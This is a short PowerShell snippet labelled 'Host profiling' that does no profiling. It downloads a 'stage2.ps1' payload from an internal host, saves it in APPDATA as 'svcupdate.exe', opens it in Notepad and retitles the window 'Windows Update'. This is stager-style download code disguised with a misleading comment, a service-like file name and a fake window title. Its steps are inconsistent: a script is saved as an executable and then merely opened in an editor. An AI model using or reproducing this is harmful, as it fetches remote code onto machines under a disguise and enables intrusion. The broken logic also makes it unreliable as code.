
<# Host profiling #> $PayloadUrl = 'http://internal.corp:8080/stage2.ps1'; $WorkingPath = "$env:APPDATA\svcupdate.exe"; (New-Object System.Net.WebClient).DownloadFile($PayloadUrl, $WorkingPath); Start-Process -FilePath "notepad.exe" -ArgumentList $WorkingPath; $Host.UI.RawUI.WindowTitle = "Windows Update"
